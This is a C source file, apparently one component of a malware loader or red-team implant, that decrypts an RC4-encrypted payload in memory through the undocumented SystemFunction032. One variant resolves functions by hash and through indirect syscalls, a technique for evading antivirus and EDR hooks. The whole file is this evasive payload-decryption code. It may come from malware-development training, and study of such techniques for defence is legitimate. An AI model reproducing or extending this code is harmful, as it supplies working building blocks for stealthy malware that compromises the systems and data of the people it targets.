#include "encryption.h"


// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
        USTRING* Img,
        USTRING* Key
);

BOOL Rc4Decrypt(IN PBYTE pPayloadData, IN SIZE_T sPayloadSize, IN PBYTE pRc4Key, IN SIZE_T dwRc4KeySize, OUT PBYTE *pPlainTextData, OUT SIZE_T *sPlainTextSize) {
        // The return of SystemFunction032
        NTSTATUS STATUS = STATUS_SUCCESS;
    
        // Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
        USTRING Key = { .Buffer = pRc4Key, .Length = (USHORT)dwRc4KeySize, .MaximumLength = (USHORT)dwRc4KeySize };
        USTRING Img = { .Buffer = pPayloadData, .Length = (USHORT)sPayloadSize, .MaximumLength = (USHORT)sPayloadSize };
    
        // Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the process,
        // and using its return as the hModule parameter in GetProcAddress
        fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
    
        // If SystemFunction032 calls failed it will return non zero value
        if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
            DebugPrint("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
            return FALSE;
        }

        // If SystemFunction032 calls succeeded update the OUT parameters and return TRUE
        *pPlainTextData = Img.Buffer;
        *sPlainTextSize = Img.Length;
    
        return TRUE;
}


BOOL Rc4DecryptStandAlone(
    IN PBYTE pPayloadData,
    IN SIZE_T sPayloadSize,
    IN PBYTE pRc4Key,
    IN SIZE_T dwRc4KeySize,
    OUT PBYTE *pPlainTextData,
    OUT SIZE_T *sPlainTextSize
) {
        NTSTATUS status;
        SIZE_T regionSize = sPayloadSize;
        PBYTE decrypted = NULL;

        // Allocate memory for the decrypted data using syscalls
        NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);        
        if (!pNtAllocateVirtualMemory) {
                DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
                return -2; // Error code
        }

        status = pNtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (status != 0) {
                DebugPrint("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
                return FALSE;
        }

        // Prepare USTRING structures for RC4 key and payload
        USTRING Key = { .Buffer = pRc4Key, .Length = (USHORT)dwRc4KeySize, .MaximumLength = (USHORT)dwRc4KeySize };
        USTRING Img = { .Buffer = decrypted, .Length = (USHORT)sPayloadSize, .MaximumLength = (USHORT)sPayloadSize };

        // Copy the payload data into allocated memory
        memcpy(decrypted, pPayloadData, sPayloadSize);

        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscallHash(NtFreeVirtualMemory_JOAA);
        if (!pNtFreeVirtualMemory) {
                DebugPrint("[-] Failed to prepare syscall for NtFreeVirtualMemory.\n");
                return -2; // Error code
        }
        
        // Resolve SystemFunction032 via indirect syscall
        fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)PrepareSyscallHash(SystemFunction032_JOAA);
        if (!pSystemFunction032) {
                DebugPrint("[-] Failed to prepare syscall for SystemFunction032.\n");
                pNtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, &regionSize, MEM_RELEASE);
                return FALSE;
        }

        // Perform RC4 decryption
        status = pSystemFunction032(&Img, &Key);
        if (status != 0x0) {
                DebugPrint("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", status);
                pNtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, &regionSize, MEM_RELEASE);
                return FALSE;
        }

        // Set output parameters
        *pPlainTextData = decrypted;
        *sPlainTextSize = Img.Length;

        return TRUE;
}

